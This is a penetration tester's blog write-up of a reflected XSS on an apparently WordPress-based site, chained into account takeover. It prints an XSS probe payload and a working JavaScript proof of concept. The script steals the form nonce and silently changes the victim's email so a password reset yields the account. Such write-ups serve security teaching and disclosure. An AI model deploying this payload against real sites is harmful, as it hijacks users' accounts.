---
layout: '@/templates/BasePost.astro'
title: Reflected XSS to Account Takeover
description: A reflected XSS vulnerability allowed attackers to change user email addresses without verification, enabling unauthorized account access via password resets.
pubDate: 2024-05-16T00:00:00Z
imgSrc: '/src/images/xss.png'
imgAlt: 'Image post'
author: "Max"
---

# What Happened
During a recent penetration test, I discovered a significant security flaw in an application that allowed for the manipulation of user email addresses through a reflected Cross-Site Scripting (XSS) vulnerability. This vulnerability made it possible for attackers to change a user’s email address to one they control, subsequently allowing them to reset the password and gain unauthorized access to the user’s account.

---

# Identifying the Vulnerability
During the pentest, I noticed that there was a feature for resetting the email address. However, when trying to change it, there was no security mechanism verifying that the change was actually initiated by the user of that account. Normally, there’s an extra step where the user must input their password or any other identification method.

So, the first thing that came to mind was trying to carry out a CSRF attack, where I force the user to change their email to mine. This would allow me to use the regular “forgot password” function from the website. Then I would input the email address that was set in the victim’s account, receive the reset email, and change the password to a desired one. However, I quickly realized that WordPress securely handles cookies in this application, so I wasn’t able to take that route. The next idea was to find an XSS vulnerability.

## Finding XSS
Luckily, during my research, I came across a reflected XSS in the application:

```js
/login/confirmmail.php?email=<img/src/onerror=print()>
```
## Creating the Exploit Script
The next step was to create a script that would automatically change the email address in the user’s settings. However, I quickly noticed that WordPress added a nonce to each form request which handles the email change. So, the next step was to first fetch the nonce and then use that nonce in the change email form request.

## The Proof of Concept
```js
fetch('https://example.com/edit-account/').then(response => response.text()).then(html => {
    // Fetch the nonce from vulnerable endpoint
    var parser = new DOMParser();
    var doc = parser.parseFromString(html, 'text/html');
    var nonce = doc.getElementById('save-account-details-nonce').value;
    console.log(nonce);

    // Change email
    fetch('https://example.com/edit-account/', { 
        method: 'POST',
        // Include Cookies
        credentials: 'include', 
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
        },
        body: `first_name=Majix
        &last_name=Majix
        &display_name=Majix
        &email=hacker@mail.com
        &password_current=
        &password_1=
        &password_2=
        &save-account-details-nonce=${nonce}`
    })
    .then(response => {
        if (response.ok) {
            console.log("Done!");
        } else {
            console.log("Something went wrong..");
        }
    });
});
```

The password parameters can be left empty, since the application only uses those, when a user wants to change their password via the UI on the website.

>password_current=\
 password_1=\
 password_2=

Here’s a step-by-step breakdown of how the attack works:

1. `Fetch the Nonce`
The attacker sends a request to the vulnerable endpoint to retrieve the nonce.
The response is parsed, and the nonce is extracted from the HTML.
2. `Change the Email` 
With the nonce in hand, the attacker sends a POST request to the endpoint responsible for changing account details.
This request includes the nonce and the attacker’s desired email address.
The credentials parameter ensures cookies are included, maintaining the session context.

So after sending this script via the reflected XSS vulnerabillity to a victim, I was successfully changing their mail to a desired one. Now I was able to use the password reset function, get the mail with a reset link, change the password, and finally log into the account.

---